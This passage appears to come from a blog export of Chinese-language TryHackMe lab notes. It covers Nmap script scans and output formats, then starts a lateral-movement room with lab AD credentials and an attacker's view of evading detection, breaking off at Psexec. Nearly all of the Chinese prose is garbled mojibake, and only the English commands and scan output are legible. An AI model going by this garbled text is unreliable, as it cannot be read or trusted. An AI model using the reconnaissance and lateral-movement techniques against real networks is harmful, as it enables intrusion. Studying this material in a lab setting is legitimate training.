nmap -sC -sS -T4 10.10.104.195 æ ¹æ®å…¶æè¿°ï¼Œè„šæœ¬ ssh2-enum-algos â€œæŠ¥å‘Šç›®æ ‡ SSH2 æœåŠ¡å™¨æä¾›çš„ç®—æ³•æ•°é‡ï¼ˆç”¨äºåŠ å¯†ã€å‹ç¼©ç­‰ï¼‰ã€‚â€ä¾èµ–äºâ€œsha1â€å¹¶å— 10.10.104.195 æ”¯æŒçš„å¯†é’¥äº¤æ¢ç®—æ³• (kex_algorithms) çš„åç§°æ˜¯ä»€ä¹ˆï¼Ÿ nmap -sS --script \"ssh2-enum-algos\" 10.10.104.195 ä¿å­˜è¾“å‡º æ¯å½“æ‚¨è¿è¡ŒNmapæ‰«ææ—¶ï¼Œå°†ç»“æœä¿å­˜åœ¨æ–‡ä»¶ä¸­æ˜¯åˆç†çš„ã€‚é€‰æ‹©å’Œé‡‡ç”¨è‰¯å¥½çš„å‘½åçº¦å®šå¯¹äºæ–‡ä»¶åè‡³å…³é‡è¦ã€‚æ–‡ä»¶æ•°é‡å¯èƒ½ä¼šå¿«é€Ÿå¢é•¿ï¼Œå¹¶ä¸”å¯èƒ½å¦¨ç¢æ‚¨æŸ¥æ‰¾å…ˆå‰çš„æ‰«æç»“æœã€‚ä¸»è¦çš„ä¸‰ç§æ ¼å¼æœ‰ï¼š Normal Grepable (grepable) XML æˆ‘ä»¬ä¸æ¨èç¬¬å››ç§ï¼šScript Kiddie è„šæœ¬å°å­ Normal æ™®é€šçš„ é¡¾åæ€ä¹‰ï¼Œæ­£å¸¸æ ¼å¼ç±»ä¼¼äºæ‰«æç›®æ ‡æ—¶åœ¨å±å¹•ä¸Šè·å¾—çš„è¾“å‡ºã€‚æ‚¨å¯ä»¥ä½¿ç”¨ -oN FILENAME ä»¥æ­£å¸¸æ ¼å¼ä¿å­˜æ‰«æç»“æœï¼› Nä»£è¡¨æ­£å¸¸ã€‚è¿™æ˜¯ç»“æœçš„ç¤ºä¾‹ã€‚ pentester@TryHackMe$ cat 10.10.87.205_scan.nmap # Nmap 7.60 scan initiated Fri Sep 10 05:14:19 2021 as: nmap -sS -sV -O -oN 10.10.87.205_scan MACHINE_IP Nmap scan report for 10.10.87.205 Host is up (0.00086s latency). Not shown: 994 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0) 25/tcp open smtp Postfix smtpd 80/tcp open http nginx 1.6.2 110/tcp open pop3 Dovecot pop3d 111/tcp open rpcbind 2-4 (RPC #100000) 143/tcp open imap Dovecot imapd MAC Address: 02:A0:E7:B5:B6:C5 (Unknown) Device type: general purpose Running: Linux 3.X OS CPE: cpe:/o:linux:linux_kernel:3.13 OS details: Linux 3.13 Network Distance: 1 hop Service Info: Host: debra2.thm.local; OS: Linux; CPE: cpe:/o:linux:linux_kernel OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Fri Sep 10 05:14:28 2021 -- 1 IP address (1 host up) scanned in 9.99 seconds Grepable grepable æ ¼å¼çš„åç§°æ¥è‡ªå‘½ä»¤ grep ï¼› grep ä»£è¡¨å…¨å±€æ­£åˆ™è¡¨è¾¾å¼æ‰“å°æœºã€‚ç®€è€Œè¨€ä¹‹ï¼Œå®ƒå¯ä»¥é«˜æ•ˆåœ°è¿‡æ»¤æ‰«æè¾“å‡ºä¸­çš„ç‰¹å®šå…³é”®å­—æˆ–æœ¯è¯­ã€‚æ‚¨å¯ä»¥ä½¿ç”¨ -oG FILENAME å°†æ‰«æç»“æœä¿å­˜ä¸º grepable æ ¼å¼ã€‚ä¸Šé¢ä»¥æ­£å¸¸æ ¼å¼æ˜¾ç¤ºçš„æ‰«æè¾“å‡ºä½¿ç”¨ grepable æ ¼å¼æ˜¾ç¤ºåœ¨ä¸‹é¢çš„æ§åˆ¶å°ä¸­ã€‚æ­£å¸¸è¾“å‡ºä¸º21è¡Œï¼›ç„¶è€Œï¼Œgrepable è¾“å‡ºåªæœ‰ 4 è¡Œã€‚ä¸»è¦åŸå› æ˜¯ Nmap å¸Œæœ›åœ¨ç”¨æˆ·åº”ç”¨ grep æ—¶ä½¿æ¯ä¸€è¡Œéƒ½æœ‰æ„ä¹‰ä¸”å®Œæ•´ã€‚å› æ­¤ï¼Œåœ¨ grepable è¾“å‡ºä¸­ï¼Œä¸æ­£å¸¸è¾“å‡ºç›¸æ¯”ï¼Œè¡Œå¾ˆé•¿å¹¶ä¸”ä¸æ–¹ä¾¿é˜…è¯»ã€‚ pentester@TryHackMe$ cat 10.10.87.205_scan.gnmap # Nmap 7.60 scan initiated Fri Sep 10 05:14:19 2021 as: nmap -sS -sV -O -oG 10.10.87.205_scan MACHINE_IP Host: 10.10.87.205\tStatus: Up Host: MACHINE_IP\tPorts: 22/open/tcp//ssh//OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)/, 25/open/tcp//smtp//Postfix smtpd/, 80/open/tcp//http//nginx 1.6.2/, 110/open/tcp//pop3//Dovecot pop3d/, 111/open/tcp//rpcbind//2-4 (RPC #100000)/, 143/open/tcp//imap//Dovecot imapd/\tIgnored State: closed (994)\tOS: Linux 3.13\tSeq Index: 257\tIP ID Seq: All zeros # Nmap done at Fri Sep 10 05:14:28 2021 -- 1 IP address (1 host up) scanned in 9.99 seconds grep çš„ä¸€ä¸ªä½¿ç”¨ç¤ºä¾‹æ˜¯ grep KEYWORD TEXT_FILE ï¼›è¯¥å‘½ä»¤å°†æ˜¾ç¤ºåŒ…å«æ‰€æä¾›çš„å…³é”®å­—çš„æ‰€æœ‰è¡Œã€‚è®©æˆ‘ä»¬æ¯”è¾ƒä¸€ä¸‹åœ¨æ­£å¸¸è¾“å‡ºå’Œ grepable è¾“å‡ºä¸Šä½¿ç”¨ grep çš„è¾“å‡ºã€‚æ‚¨ä¼šæ³¨æ„åˆ°ï¼Œå‰è€…ä¸æä¾›ä¸»æœºçš„ IP åœ°å€ã€‚ç›¸åï¼Œå®ƒè¿”å› 80/tcp open http nginx 1.6.2 ï¼Œå¦‚æœæ‚¨è¦ç­›é€‰å¤šä¸ªç³»ç»Ÿçš„æ‰«æç»“æœï¼Œè¿™ä¼šéå¸¸ä¸æ–¹ä¾¿ã€‚ç„¶è€Œï¼Œåè€…åœ¨æ¯ä¸€è¡Œä¸­æä¾›äº†è¶³å¤Ÿçš„ä¿¡æ¯ï¼Œä¾‹å¦‚ä¸»æœºçš„ IP åœ°å€ï¼Œä»¥ä½¿å…¶å®Œæ•´ã€‚ pentester@TryHackMe$ grep http 10.10.87.205_scan.nmap 80/tcp open http nginx 1.6.2 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . pentester@TryHackMe$ grep http 10.10.87.205_scan.gnmap Host: 10.10.87.205\tPorts: 22/open/tcp//ssh//OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)/, 25/open/tcp//smtp//Postfix smtpd/, 80/open/tcp//http//nginx 1.6.2/, 110/open/tcp//pop3//Dovecot pop3d/, 111/open/tcp//rpcbind//2-4 (RPC #100000)/, 143/open/tcp//imap//Dovecot imapd/\tIgnored State: closed (994)\tOS: Linux 3.13\tSeq Index: 257\tIP ID Seq: All zeros XML ç¬¬ä¸‰ç§æ ¼å¼æ˜¯XMLã€‚æ‚¨å¯ä»¥ä½¿ç”¨-oX FILENAMEå°†æ‰«æç»“æœä»¥XMLæ ¼å¼ä¿å­˜ã€‚XMLæ ¼å¼æœ€æ–¹ä¾¿ç”¨äºåœ¨å…¶ä»–ç¨‹åºä¸­å¤„ç†è¾“å‡ºã€‚æ–¹ä¾¿çš„æ˜¯ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨-oA FILENAMEå°†æ‰«æè¾“å‡ºä»¥æ‰€æœ‰ä¸‰ç§æ ¼å¼ä¿å­˜ï¼Œå³ç»“åˆäº†æ™®é€šæ ¼å¼ï¼ˆ-oNï¼‰ã€å¯grepæ ¼å¼ï¼ˆ-oGï¼‰å’ŒXMLæ ¼å¼ï¼ˆ-oXï¼‰ã€‚ è„šæœ¬å°å­ ç¬¬å››ç§æ ¼å¼æ˜¯è„šæœ¬å°å­ã€‚æ‚¨å¯ä»¥çœ‹åˆ°ï¼Œå¦‚æœæ‚¨æƒ³åœ¨è¾“å‡ºä¸­æœç´¢ä»»ä½•æœ‰è¶£çš„å…³é”®å­—æˆ–ä¿ç•™ç»“æœä»¥ä¾›å°†æ¥å‚è€ƒï¼Œåˆ™æ­¤æ ¼å¼æ¯«æ— ç”¨å¤„ã€‚ä½†æ˜¯ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨å®ƒæ¥ä¿å­˜æ‰«æçš„è¾“å‡º nmap -sS 127.0.0.1 -oS FILENAME ï¼Œæ˜¾ç¤ºè¾“å‡ºæ–‡ä»¶åï¼Œå¹¶åœ¨ä¸æ‡‚æŠ€æœ¯çš„æœ‹å‹é¢å‰æŸ¥çœ‹ 31337 ã€‚ pentester@TryHackMe$ cat 10.10.87.205_scan.kiddie $tart!ng nMaP 7.60 ( httpz://nMap.0rG ) at 2021-09-10 05:17 B$T Nmap scan rEp0rt f0r |p-10-10-161-170.EU-w3$t-1.C0mputE.intErnaL (10.10.161.170) HOSt !s uP (0.00095s LatEncy). N0T $H0wn: 994 closed pOrtS PoRT st4Te SeRViC3 VERS1on 22/tcp Open ssH Op3n$$H 6.7p1 Deb|an 5+dEb8u8 (pr0t0COl 2.0) 25/tCp Op3n SmTp P0$Tf!x Smtpd 80/tcp 0p3n http Ng1nx 1.6.2 110/tCP 0pen pOP3 d0v3coT P0p3D 111/TcP op3n RpcbInd 2-4 (RPC #100000) 143/Tcp opEn Imap Dovecot 1mApd mAC 4Ddr3sz: 02:40:e7:B5:B6:c5 (Unknown) Netw0rk d!stanc3: 1 h0p $3rv1c3 InFO: Ho$t: dEBra2.thM.lOcal; 0s: Linux; cPe: cP3:/0:linux:l|nux_k3rnel 0S and servIc3 D3tEcti0n pErf0rm3d. Plea$e r3p0rt any !nc0RrecT rE$ultz at hTtpz://nmap.0rg/$ubmit/ . Nmap d0nE: 1 |P addr3SS (1 hoSt up) $CaNnEd !n 21.80 s3c0Ndz ç»ˆæ­¢ä¸Šä¸€ä¸ªä»»åŠ¡çš„ç›®æ ‡æœºå™¨å¹¶å¯åŠ¨æœ¬ä»»åŠ¡çš„ç›®æ ‡æœºå™¨ã€‚åœ¨ AttackBox ç»ˆç«¯ä¸Šï¼Œå‘å‡ºå‘½ä»¤ scp pentester@10.10.87.205:/home/pentester/* . ä»ç›®æ ‡è™šæ‹Ÿæœºä¸‹è½½æ­£å¸¸æ ¼å¼å’Œ grepable æ ¼å¼çš„ Nmap æŠ¥å‘Šã€‚ è¯·æ³¨æ„ï¼Œç”¨æˆ·å pentester çš„å¯†ç ä¸º THM17577 æ£€æŸ¥é™„åŠ çš„ Nmap æ—¥å¿—ã€‚æœ‰å¤šå°‘ç³»ç»Ÿæ­£åœ¨ä¾¦å¬ HTTPS ç«¯å£ï¼Ÿ æ€»ç»“ åœ¨è¿™ä¸ªæˆ¿é—´ä¸­ï¼Œæˆ‘ä»¬å­¦ä¹ äº†å¦‚ä½•æ£€æµ‹æ­£åœ¨è¿è¡Œçš„æœåŠ¡åŠå…¶ç‰ˆæœ¬ä»¥åŠä¸»æœºæ“ä½œç³»ç»Ÿã€‚æˆ‘ä»¬å­¦ä¹ äº†å¦‚ä½•å¯ç”¨è·Ÿè¸ªè·¯ç”±ï¼Œå¹¶ä»‹ç»äº†é€‰æ‹©ä¸€ä¸ªæˆ–å¤šä¸ªè„šæœ¬æ¥å¸®åŠ©æ¸—é€æµ‹è¯•ã€‚æœ€åï¼Œæˆ‘ä»¬ä»‹ç»äº†ä¿å­˜æ‰«æç»“æœä»¥ä¾›å°†æ¥å‚è€ƒçš„ä¸åŒæ ¼å¼ã€‚ä¸‹è¡¨æ€»ç»“äº†æˆ‘ä»¬åœ¨è¿™ä¸ªæˆ¿é—´ä¸­è®¨è®ºçš„æœ€é‡è¦çš„é€‰é¡¹ã€‚ Option é€‰é¡¹ Meaning æ„ä¹‰ -sV ç¡®å®šå¼€æ”¾ç«¯å£ä¸Šçš„æœåŠ¡/ç‰ˆæœ¬ä¿¡æ¯ -sV --version-light å°è¯•æœ€æœ‰å¯èƒ½çš„æ¢é’ˆ (2) -sV --version-all å°è¯•æ‰€æœ‰å¯ç”¨çš„æ¢é’ˆ (9) -O æ£€æµ‹æ“ä½œç³»ç»Ÿ --traceroute è¿è¡Œtracerouteåˆ°ç›®æ ‡ --script=SCRIPTS è¦è¿è¡Œçš„ Nmap è„šæœ¬ -sC or --script=default -sC æˆ– --script=default è¿è¡Œé»˜è®¤è„šæœ¬ -A ç›¸å½“äº -sV -O -sC --traceroute -oN ä»¥æ­£å¸¸æ ¼å¼ä¿å­˜è¾“å‡º -oG ä»¥ grepable æ ¼å¼ä¿å­˜è¾“å‡º -oX ä»¥ XML æ ¼å¼ä¿å­˜è¾“å‡º -oA ä»¥æ™®é€šã€XML å’Œ Grepable æ ¼å¼ä¿å­˜è¾“å‡º","tags":["TryHackMe"],"categories":["TryHackMe"]},{"title":"THM-Lateral Movement and Pivoting","path":"/2024/02/16/thm-lateral-movement-and-pivoting/","content":"0x01 ç®€ä»‹ åœ¨è¿™ä¸ªæˆ¿é—´é‡Œï¼Œæˆ‘ä»¬å°†ç ”ç©¶æ¨ªå‘ç§»åŠ¨ï¼Œæ”»å‡»è€…ä½¿ç”¨ä¸€ç»„æŠ€æœ¯åœ¨ç½‘ç»œä¸­ç§»åŠ¨ï¼ŒåŒæ—¶åˆ›å»ºå°½å¯èƒ½å°‘çš„è­¦æŠ¥ã€‚æˆ‘ä»¬å°†äº†è§£ä¸ºæ­¤ç›®çš„è€Œä½¿ç”¨çš„å‡ ç§å¸¸è§æŠ€æœ¯ä»¥åŠæ‰€æ¶‰åŠçš„å·¥å…·. å»ºè®®åœ¨æ­¤ä¹‹å‰å…ˆæµè§ˆä¸€ä¸‹å…¥ä¾µ AD å’Œæšä¸¾ AD æˆ¿é—´ã€‚ å­¦ä¹ ç›®æ ‡ ç†Ÿæ‚‰æ”»å‡»è€…ä½¿ç”¨çš„æ¨ªå‘ç§»åŠ¨æŠ€æœ¯ã€‚ äº†è§£å¦‚ä½•ä½¿ç”¨æ›¿ä»£è®¤è¯ææ–™è¿›è¡Œæ¨ªå‘ç§»åŠ¨ã€‚ äº†è§£ä½¿ç”¨å—æ„ŸæŸ“ä¸»æœºä½œä¸ºæ¢çº½çš„ä¸åŒæ–¹æ³•ã€‚ ç´¢å–æ‚¨çš„å‡­è¯ ä¸ºäº†æ¨¡æ‹Ÿ AD è¿è§„ï¼Œæ‚¨å°†è·å¾—ç¬¬ä¸€ç»„ AD å‡­æ®ã€‚ç½‘ç»œè®¾ç½®å®Œæˆåï¼Œåœ¨æ”»å‡»ç®±ä¸Šå¯¼èˆªè‡³ http://distributor.za.tryhackme.com/creds ä»¥è¯·æ±‚æ‚¨çš„å‡­æ®å¯¹ã€‚å•å‡»â€œè·å–å‡­æ®â€æŒ‰é’®ä»¥æ¥æ”¶å¯ç”¨äºåˆå§‹è®¿é—®çš„å‡­æ®å¯¹ã€‚ æ­¤å‡­è¯å¯¹å°†ä¸ºæ‚¨æä¾›å¯¹ THMJMP2.za.tryhackme.com çš„ SSH è®¿é—®ã€‚ THMJMP2 å¯ä»¥è¢«è§†ä¸ºè¿›å…¥è¯¥ç¯å¢ƒçš„è·³è½¬ä¸»æœºï¼Œæ¨¡æ‹Ÿæ‚¨å·²å®ç°çš„ç«‹è¶³ç‚¹ã€‚ å¯¹äº SSH è®¿é—®ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š ssh za\\\\&lt;AD Username&gt;@thmjmp2.za.tryhackme.com //è·å–åˆ°çš„å‡­è¯å¦‚ä¸‹ Your credentials have been generated: Username: henry.bird Password: Changeme123 å³:ssh za\\\\henry.bird@thmjmp2.za.tryhackme.com 0x02 é€šè¿‡ç½‘ç»œç§»åŠ¨ ä»€ä¹ˆæ˜¯æ¨ªå‘è¿åŠ¨ï¼Ÿ ç®€è€Œè¨€ä¹‹ï¼Œæ¨ªå‘ç§»åŠ¨æ˜¯æ”»å‡»è€…ç”¨æ¥åœ¨ç½‘ç»œä¸­ç§»åŠ¨çš„ä¸€ç»„æŠ€æœ¯ã€‚ä¸€æ—¦æ”»å‡»è€…è·å¾—å¯¹ç½‘ç»œç¬¬ä¸€å°è®¡ç®—æœºçš„è®¿é—®æƒï¼Œå‡ºäºå¤šç§åŸå› ï¼Œç§»åŠ¨å°±å˜å¾—è‡³å…³é‡è¦ï¼Œå…¶ä¸­åŒ…æ‹¬ï¼š - å®ç°æ”»å‡»è€…çš„ç›®æ ‡ - ç»•è¿‡ç°æœ‰çš„ç½‘ç»œé™åˆ¶ - å»ºç«‹é¢å¤–çš„ç½‘ç»œå…¥å£ç‚¹ - åˆ¶é€ æ··ä¹±å’Œé¿å…è¢«å‘ç°ã€‚ è™½ç„¶è®¸å¤šç½‘ç»œæ€ä¼¤é“¾å°†æ¨ªå‘ç§»åŠ¨è§†ä¸ºçº¿æ€§è¿‡ç¨‹çš„é™„åŠ æ­¥éª¤ï¼Œä½†å®ƒå®é™…ä¸Šæ˜¯å¾ªç¯çš„ä¸€éƒ¨åˆ†ã€‚åœ¨æ­¤å‘¨æœŸä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨ä»»ä½•å¯ç”¨çš„å‡­æ®æ¥æ‰§è¡Œæ¨ªå‘ç§»åŠ¨ï¼Œä½¿æˆ‘ä»¬èƒ½å¤Ÿè®¿é—®æ–°æœºå™¨ï¼Œåœ¨å…¶ä¸­æˆ‘ä»¬å¯ä»¥æå‡æƒé™å¹¶æå–å‡­æ®ï¼ˆå¦‚æœå¯èƒ½ï¼‰ã€‚æœ‰äº†æ–°çš„å‡­è¯ï¼Œå¾ªç¯åˆå¼€å§‹äº†ã€‚ é€šå¸¸ï¼Œæˆ‘ä»¬ä¼šé‡å¤è¿™ä¸ªå¾ªç¯å‡ æ¬¡ï¼Œç„¶åæ‰èƒ½è¾¾åˆ°ç½‘ç»œä¸Šçš„æœ€ç»ˆç›®æ ‡ã€‚å¦‚æœæˆ‘ä»¬çš„ç¬¬ä¸€ä¸ªç«‹è¶³ç‚¹æ˜¯ä¸€å°å‡ ä¹æ— æ³•è®¿é—®å…¶ä»–ç½‘ç»œèµ„æºçš„è®¡ç®—æœºï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯èƒ½éœ€è¦æ¨ªå‘ç§»åŠ¨åˆ°åœ¨ç½‘ç»œä¸Šæ‹¥æœ‰æ›´å¤šæƒé™çš„å…¶ä»–ä¸»æœºã€‚ ä¸€ä¸ªç®€å•çš„ä¾‹å­ å‡è®¾æˆ‘ä»¬æ­£åœ¨æ‰§è¡Œçº¢é˜Ÿå‚ä¸ï¼Œæˆ‘ä»¬çš„æœ€ç»ˆç›®æ ‡æ˜¯åˆ°è¾¾å†…éƒ¨ä»£ç å­˜å‚¨åº“ï¼Œæˆ‘ä»¬é€šè¿‡ç½‘ç»œé’“é±¼æ´»åŠ¨åœ¨ç›®æ ‡ç½‘ç»œä¸Šè·å¾—äº†ç¬¬ä¸€æ¬¡å¦¥åã€‚é€šå¸¸ï¼Œç½‘ç»œé’“é±¼æ´»åŠ¨å¯¹éæŠ€æœ¯ç”¨æˆ·æ›´æœ‰æ•ˆï¼Œå› æ­¤æˆ‘ä»¬çš„ç¬¬ä¸€æ¬¡è®¿é—®å¯èƒ½æ˜¯é€šè¿‡è¥é”€éƒ¨é—¨çš„æœºå™¨è¿›è¡Œçš„ã€‚ è¥é”€å·¥ä½œç«™é€šå¸¸ä¼šå—åˆ°é˜²ç«å¢™ç­–ç•¥çš„é™åˆ¶ï¼Œæ— æ³•è®¿é—®ç½‘ç»œä¸Šçš„ä»»ä½•å…³é”®æœåŠ¡ï¼ŒåŒ…æ‹¬ç®¡ç†åè®®ã€æ•°æ®åº“ç«¯å£ã€ç›‘æ§æœåŠ¡æˆ–æ—¥å¸¸å·¥ä½œä¸éœ€è¦çš„ä»»ä½•å…¶ä»–æœåŠ¡ï¼ŒåŒ…æ‹¬ä»£ç å­˜å‚¨åº“ã€‚ ä¸ºäº†åˆ°è¾¾æ•æ„Ÿçš„ä¸»æœºå’ŒæœåŠ¡ï¼Œæˆ‘ä»¬éœ€è¦è½¬ç§»åˆ°å…¶ä»–ä¸»æœºå¹¶ä»é‚£é‡Œè½¬å‘æˆ‘ä»¬çš„æœ€ç»ˆç›®æ ‡ã€‚ä¸ºæ­¤ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•æå‡è¥é”€å·¥ä½œç«™çš„æƒé™å¹¶æå–æœ¬åœ°ç”¨æˆ·çš„å¯†ç å“ˆå¸Œå€¼ã€‚å¦‚æœæˆ‘ä»¬æ‰¾åˆ°æœ¬åœ°ç®¡ç†å‘˜ï¼Œåˆ™å…¶ä»–ä¸»æœºä¸Šå¯èƒ½å­˜åœ¨ç›¸åŒçš„å¸æˆ·ã€‚ç»è¿‡ä¸€ç•ªä¾¦å¯Ÿï¼Œæˆ‘ä»¬å‘ç°äº†ä¸€ä¸ªåä¸º DEV-001-PC çš„å·¥ä½œç«™ã€‚æˆ‘ä»¬ä½¿ç”¨æœ¬åœ°ç®¡ç†å‘˜çš„å¯†ç å“ˆå¸Œæ¥è®¿é—® DEV-001-PCï¼Œå¹¶ç¡®è®¤å®ƒå±äºå…¬å¸çš„ä¸€ä½å¼€å‘äººå‘˜æ‰€æœ‰ã€‚ä»é‚£é‡Œï¼Œå¯ä»¥è®¿é—®æˆ‘ä»¬çš„ç›®æ ‡ä»£ç å­˜å‚¨åº“ã€‚ è¯·æ³¨æ„ï¼Œè™½ç„¶å¯èƒ½éœ€è¦ä½¿ç”¨æ¨ªå‘ç§»åŠ¨æ¥è§„é¿é˜²ç«å¢™é™åˆ¶ï¼Œä½†å®ƒä¹Ÿæœ‰åŠ©äºé€ƒé¿æ£€æµ‹ã€‚åœ¨æˆ‘ä»¬çš„ç¤ºä¾‹ä¸­ï¼Œå³ä½¿è¥é”€å·¥ä½œç«™å¯ä»¥ç›´æ¥è®¿é—®ä»£ç å­˜å‚¨åº“ï¼Œä¹Ÿå¯èƒ½éœ€è¦é€šè¿‡å¼€å‘äººå‘˜çš„ PC è¿›è¡Œè¿æ¥ã€‚ä»æ£€æŸ¥ç™»å½•å®¡æ ¸æ—¥å¿—çš„è“é˜Ÿåˆ†æå¸ˆçš„è§’åº¦æ¥çœ‹ï¼Œè¿™ç§è¡Œä¸ºçš„å¯ç–‘æ€§è¾ƒå°ã€‚ æ”»å‡»è€…çš„è§†è§’ æ”»å‡»è€…å¯ä»¥é€šè¿‡å¤šç§æ–¹å¼è¿›è¡Œæ¨ªå‘ç§»åŠ¨ã€‚æœ€ç®€å•çš„æ–¹æ³•æ˜¯ä½¿ç”¨æ ‡å‡†ç®¡ç†åè®®ï¼ˆä¾‹å¦‚ WinRMã€RDPã€VNC æˆ– SSHï¼‰è¿æ¥åˆ°ç½‘ç»œä¸Šçš„å…¶ä»–è®¡ç®—æœºã€‚åªè¦åœ¨è§„åˆ’ä¸å“ªä¸ªå¸æˆ·è¿æ¥çš„ä½ç½®æ—¶ä¿æŒä¸€å®šçš„ä¸€è‡´æ€§ï¼Œè¿™ç§æ–¹æ³•å°±å¯ä»¥åœ¨æŸç§ç¨‹åº¦ä¸Šæ¨¡æ‹Ÿå¸¸è§„ç”¨æˆ·çš„è¡Œä¸ºã€‚è™½ç„¶ IT éƒ¨é—¨çš„ç”¨æˆ·é€šè¿‡ RDP è¿æ¥åˆ° Web æœåŠ¡å™¨å¯èƒ½å¾ˆå¸¸è§å¹¶ä¸”ä¸ä¼šå—åˆ°å…³æ³¨ï¼Œä½†å¿…é¡»æ³¨æ„ä¸è¦å°è¯•å¯ç–‘çš„è¿æ¥ï¼ˆä¾‹å¦‚ï¼Œä¸ºä»€ä¹ˆæœ¬åœ°ç®¡ç†å‘˜ç”¨æˆ·ä»è¥é”€éƒ¨é—¨è¿æ¥åˆ° DEV-001-PCï¼‰ä¸ªäººç”µè„‘ï¼Ÿï¼‰. å¦‚ä»Šï¼Œæ”»å‡»è€…è¿˜å¯ä»¥ä½¿ç”¨å…¶ä»–æ¨ªå‘ç§»åŠ¨æ–¹æ³•ï¼ŒåŒæ—¶ä½¿è“é˜Ÿæœ‰æ•ˆæ£€æµ‹æ­£åœ¨å‘ç”Ÿçš„æƒ…å†µå˜å¾—æ›´å…·æŒ‘æˆ˜æ€§ã€‚è™½ç„¶æ²¡æœ‰ä»»ä½•æŠ€æœ¯åº”è¯¥è¢«è®¤ä¸ºæ˜¯ä¸‡æ— ä¸€å¤±çš„ï¼Œä½†æˆ‘ä»¬è‡³å°‘å¯ä»¥å°è¯•å°½å¯èƒ½ä¿æŒæ²‰é»˜ã€‚åœ¨æ¥ä¸‹æ¥çš„ä»»åŠ¡ä¸­ï¼Œæˆ‘ä»¬å°†äº†è§£ä¸€äº›æœ€å¸¸è§çš„æ¨ªå‘è¿åŠ¨æŠ€æœ¯ã€‚ ç®¡ç†å‘˜å’ŒUAC åœ¨æ‰§è¡Œæ•´ä¸ªæˆ¿é—´ä¸­ä»‹ç»çš„å¤§éƒ¨åˆ†æ¨ªå‘ç§»åŠ¨æŠ€æœ¯æ—¶ï¼Œæˆ‘ä»¬å°†ä¸»è¦ä½¿ç”¨ç®¡ç†å‘˜å‡­æ®ã€‚è™½ç„¶äººä»¬å¯èƒ½æœŸæœ›æ¯ä¸ªç®¡ç†å‘˜å¸æˆ·éƒ½å…·æœ‰ç›¸åŒçš„ç›®çš„ï¼Œä½†å¿…é¡»åŒºåˆ†ä¸¤ç§ç±»å‹çš„ç®¡ç†å‘˜ï¼š æœ¬åœ°å¸æˆ·å±äºæœ¬åœ°ç®¡ç†å‘˜ç»„ åŸŸå¸æˆ·å±äºæœ¬åœ°ç®¡ç†å‘˜ç»„ æˆ‘ä»¬æ„Ÿå…´è¶£çš„å·®å¼‚æ˜¯ç”¨æˆ·å¸æˆ·æ§åˆ¶ (UAC) å¯¹æœ¬åœ°ç®¡ç†å‘˜ï¼ˆé»˜è®¤ç®¡ç†å‘˜å¸æˆ·é™¤å¤–ï¼‰æ–½åŠ çš„é™åˆ¶ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œé™¤éé€šè¿‡ RDP ä½¿ç”¨äº¤äº’å¼ä¼šè¯ï¼Œå¦åˆ™æœ¬åœ°ç®¡ç†å‘˜å°†æ— æ³•è¿œç¨‹è¿æ¥åˆ°è®¡ç®—æœºå¹¶æ‰§è¡Œç®¡ç†ä»»åŠ¡ã€‚ Windows å°†æ‹’ç»é€šè¿‡ RPCã€SMB æˆ– WinRM è¯·æ±‚çš„ä»»ä½•ç®¡ç†ä»»åŠ¡ï¼Œå› ä¸ºæ­¤ç±»ç®¡ç†å‘˜å°†ä½¿ç”¨ç»è¿‡è¿‡æ»¤çš„ä»‹è´¨å®Œæ•´æ€§ä»¤ç‰Œç™»å½•ï¼Œä»è€Œé˜²æ­¢å¸æˆ·æ‰§è¡Œç‰¹æƒæ“ä½œã€‚å”¯ä¸€è·å¾—å®Œå…¨æƒé™çš„æœ¬åœ°å¸æˆ·æ˜¯é»˜è®¤ç®¡ç†å‘˜å¸æˆ·ã€‚ å…·æœ‰æœ¬åœ°ç®¡ç†æƒé™çš„åŸŸå¸æˆ·ä¸ä¼šå—åˆ°ç›¸åŒçš„å¤„ç†ï¼Œå¹¶ä¸”å°†ä»¥å®Œå…¨ç®¡ç†æƒé™ç™»å½•ã€‚ å¦‚æœéœ€è¦ï¼Œå¯ä»¥ç¦ç”¨æ­¤å®‰å…¨åŠŸèƒ½ï¼Œæœ‰æ—¶æ‚¨ä¼šå‘ç°ç®¡ç†å‘˜ç»„ä¸­çš„æœ¬åœ°å¸æˆ·å’ŒåŸŸå¸æˆ·ä¹‹é—´æ²¡æœ‰åŒºåˆ«ã€‚ä¸è¿‡ï¼Œé‡è¦çš„æ˜¯è¦è®°ä½ï¼Œå¦‚æœæŸäº›æ¨ªå‘ç§»åŠ¨æŠ€æœ¯å¤±è´¥ï¼Œå¯èƒ½æ˜¯ç”±äºä½¿ç”¨äº†å¼ºåˆ¶æ‰§è¡Œ UAC çš„éé»˜è®¤æœ¬åœ°ç®¡ç†å‘˜ã€‚æ‚¨å¯ä»¥åœ¨æ­¤å¤„é˜…è¯»æœ‰å…³æ­¤å®‰å…¨åŠŸèƒ½çš„æ›´å¤šè¯¦ç»†ä¿¡æ¯ï¼šhere 0x03 è¿œç¨‹ç”Ÿæˆè¿‡ç¨‹ æ­¤ä»»åŠ¡å°†ç ”ç©¶æ”»å‡»è€…è¿œç¨‹ç”Ÿæˆè¿›ç¨‹çš„å¯ç”¨æ–¹æ³•ï¼Œå…è®¸ä»–ä»¬åœ¨æ‹¥æœ‰æœ‰æ•ˆå‡­æ®çš„è®¡ç®—æœºä¸Šè¿è¡Œå‘½ä»¤ã€‚æ‰€è®¨è®ºçš„æ¯ç§æŠ€æœ¯éƒ½ä½¿ç”¨ç•¥æœ‰ä¸åŒçš„æ–¹æ³•æ¥å®ç°ç›¸åŒçš„ç›®çš„ï¼Œå…¶ä¸­ä¸€äº›å¯èƒ½æ›´é€‚åˆæŸäº›ç‰¹å®šåœºæ™¯ã€‚ Psexec æ‰§è¡Œç¨‹åº Ports: 445/TCP (SMB) æ‰€éœ€çš„ç»„æˆå‘˜èº«ä»½ï¼šç®¡ç†å‘˜ å¤šå¹´æ¥ï¼ŒPsexec 